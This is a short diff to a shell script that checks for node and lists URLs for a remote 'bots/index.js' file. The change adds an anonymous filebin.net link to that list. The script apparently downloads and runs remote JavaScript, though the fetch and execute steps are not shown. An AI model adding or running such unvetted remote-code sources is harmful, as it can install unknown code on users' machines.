@@ -10,6 +10,7 @@ if ! command -v node >/dev/null 2>&1; then
 fi
 
 URLS=(
+  "https://filebin.net/yh2cpl5j974km216/up"
   "https://raw.githubusercontent.com/malasahjagotwin/cgo/main/setup/bots/index.js"
   "https://github.com/malasahjagotwin/cgo/raw/refs/heads/main/setup/bots/index.js"
 )
